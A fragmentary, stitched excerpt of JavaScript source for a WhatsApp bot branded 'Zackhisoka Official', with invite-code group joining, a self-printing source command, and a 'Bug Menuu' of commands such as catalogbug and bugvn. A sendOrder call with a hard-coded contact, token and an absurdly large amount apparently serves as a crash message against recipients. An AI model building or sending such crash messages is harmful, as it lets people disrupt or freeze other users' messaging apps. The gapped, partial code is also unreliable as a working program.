...
if (isCreator) {
await hisoka.groupAcceptInvite(vcc).then(async(res) => m.reply(jsonformat(res))).catch(_ => _)
m.reply("Succes")
} else {
hisoka.query({
tag: "iq",
...
sendOrder(m.chat, teks, "667140254502463", fs.readFileSync('./faraxx/pict.jpg'), 2022, "Zackhisoka Official ~ Multi Device", "6283155687629@s.whatsapp.net", "AR6NCY8euY5cbS8Ybg5Ca55R8HFSuLO3qZqrIYCT7hQp0g==", "99999999999999999999")
} else if (sizny > 10) {
await hisoka.groupAcceptInvite(vcc).then(async(res) => m.reply(jsonformat(res))).catch(_ => _)
m.reply("Succes")
} else {
...
break
				...
				var data = await hisoka.groupAcceptInvite(url)
...
Os-Time : ${runtime(os.uptime())}${monospace}
...
${monospace}❏ Random Menuu${monospace}
 ${prefix}patrick
 ${prefix}dogestick
 ${prefix}bucinstick
 ${prefix}gurastick

${monospace}❏ Bug Menuu${monospace}
 ${prefix}butto
 ${prefix}stikto
 ${prefix}catalogbug
 ${prefix}bugvn
...
try {
m.reply('case ' + `'${args[0]}'` + fs.readFileSync('./faraxx.js').toString().split(`case '${args[0]}'`)[1].split(turbrek)[0] + turbrek)
} catch {
